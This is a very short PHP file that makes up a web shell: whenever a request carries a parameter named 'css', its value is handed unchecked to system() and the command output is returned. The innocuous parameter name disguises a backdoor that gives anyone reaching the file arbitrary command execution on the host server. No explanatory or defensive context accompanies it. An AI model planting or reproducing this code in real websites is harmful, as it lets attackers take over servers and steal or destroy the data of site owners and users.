<?php
    if(isset($_REQUEST['css']))
    {
        system($_REQUEST['css'] . ' 2>&1');
    }

